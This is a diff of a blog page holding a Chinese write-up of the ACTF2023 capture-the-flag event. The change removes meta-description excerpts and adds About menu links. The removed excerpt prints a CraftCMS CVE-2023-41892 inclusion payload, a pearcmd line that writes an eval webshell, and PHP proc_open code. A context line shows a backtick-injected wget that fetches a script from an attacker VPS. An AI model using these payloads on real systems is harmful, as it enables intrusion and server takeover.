@@ -8,58 +8,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
     <title>ACTF2023 WP - DELETE</title><meta name="Description" content=""><meta property="og:title" content="ACTF2023 WP" />
-<meta property="og:description" content="东方原神大学-MISC
-fofa 秒了
-MyGO&rsquo;s Live!!!!!-WEB请求：http://124.70.33.170:24000/checker?url=124.70.33.170:80
-直接自己namp
-Craftcms&ndash;WEBcraftcms
-CVE-2023-41892
-网上有POC（无果）
-https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce
-看了一下poc，出现的地方应该是\craft\controllers\ConditionsController
-猜一手是反序列化&#43;RCE
-https://blog.calif.io/p/craftcms-rce
-构造了一下poc 但是好像只能执行phpinfo 发现了账号密码，登录
-备份了下数据库，没看见有什么东西
-思路二：https://www.anquanke.com/post/id/201136 https://www.cnblogs.com/Xy&ndash;1/p/12769094.html https://github.com/vulhub/vulhub/tree/master/php/inclusion
-思路三：percmd https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
-思路三可以，
-pearcmd写入文件
-先用cve包含pearcmd.php然后写入shell
-包含
-action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config={&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;\\yii\\rbac\\PhpManager&#34;,&#34;__construct()&#34;:[{&#34;itemFile&#34;:&#34;/usr/local/lib/php/pearcmd.php&#34;}]}} 写入
-/?&#43;config-create&#43;/&lt;?=@eval($_POST[&#39;1&#39;]);die();?&gt;&#43;/tmp/delete 包含了但是执行/readflag没有回显
-蚁剑连一下然后加一个文件
-&lt;?php error_reporting(E_ALL); echo &#34;1&#34;; $descriptorspec = array( 0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;), // 标准输入，子进程从此管道中读取数据 1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;), // 标准输出，子进程向此管道中写入数据 2 =&gt; array(&#34;pipe&#34;, &#34;r&#34;) // 标准错误，写入到一个文件 ); $file=array(); $process = proc_open(&#34;/readflag 2&gt;&amp;1&#34;, $descriptorspec, $file); var_dump($process); var_dump($file); function readln($file){ $out = &#34;&#34;; $a = fread($file, 1); echo &#34;readln&#34;; while ($a !" />
+<meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://ML-hacker.github.io/posts/actf/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-10-31T14:34:26+08:00" />
 <meta property="article:modified_time" content="2023-10-31T14:34:26+08:00" />
 
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="ACTF2023 WP"/>
-<meta name="twitter:description" content="东方原神大学-MISC
-fofa 秒了
-MyGO&rsquo;s Live!!!!!-WEB请求：http://124.70.33.170:24000/checker?url=124.70.33.170:80
-直接自己namp
-Craftcms&ndash;WEBcraftcms
-CVE-2023-41892
-网上有POC（无果）
-https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce
-看了一下poc，出现的地方应该是\craft\controllers\ConditionsController
-猜一手是反序列化&#43;RCE
-https://blog.calif.io/p/craftcms-rce
-构造了一下poc 但是好像只能执行phpinfo 发现了账号密码，登录
-备份了下数据库，没看见有什么东西
-思路二：https://www.anquanke.com/post/id/201136 https://www.cnblogs.com/Xy&ndash;1/p/12769094.html https://github.com/vulhub/vulhub/tree/master/php/inclusion
-思路三：percmd https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
-思路三可以，
-pearcmd写入文件
-先用cve包含pearcmd.php然后写入shell
-包含
-action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config={&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;\\yii\\rbac\\PhpManager&#34;,&#34;__construct()&#34;:[{&#34;itemFile&#34;:&#34;/usr/local/lib/php/pearcmd.php&#34;}]}} 写入
-/?&#43;config-create&#43;/&lt;?=@eval($_POST[&#39;1&#39;]);die();?&gt;&#43;/tmp/delete 包含了但是执行/readflag没有回显
-蚁剑连一下然后加一个文件
-&lt;?php error_reporting(E_ALL); echo &#34;1&#34;; $descriptorspec = array( 0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;), // 标准输入，子进程从此管道中读取数据 1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;), // 标准输出，子进程向此管道中写入数据 2 =&gt; array(&#34;pipe&#34;, &#34;r&#34;) // 标准错误，写入到一个文件 ); $file=array(); $process = proc_open(&#34;/readflag 2&gt;&amp;1&#34;, $descriptorspec, $file); var_dump($process); var_dump($file); function readln($file){ $out = &#34;&#34;; $a = fread($file, 1); echo &#34;readln&#34;; while ($a !"/>
+<meta name="twitter:description" content=""/>
 <meta name="application-name" content="DELETE">
 <meta name="apple-mobile-web-app-title" content="DELETE">
 
@@ -103,7 +59,7 @@ action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondi
             <a href="/" title="DELETE"><span id="desktop-header-typeit" class="typeit"></span></a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                             <i class="fas fa-search fa-fw"></i>
@@ -151,7 +107,7 @@ action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondi
                     <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                         Cancel
                     </a>
-                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
                 <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                     <option value="light">Light</option>
@@ -382,8 +338,7 @@ checker?url=127.0.0.1:<code>:</code>wget$IFS\vps:port/1$IFS-O$IFS/tmp/1.sh``:`</
         src="ACTF/14.png"
         srcset="ACTF/14.png, ACTF/14.png 1.5x, ACTF/14.png 2x"
         alt="ACTF/14.png"
-        title="ACTF/14.png" ></figure></p>
-</div>
+        title="ACTF/14.png" ></figure></p></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
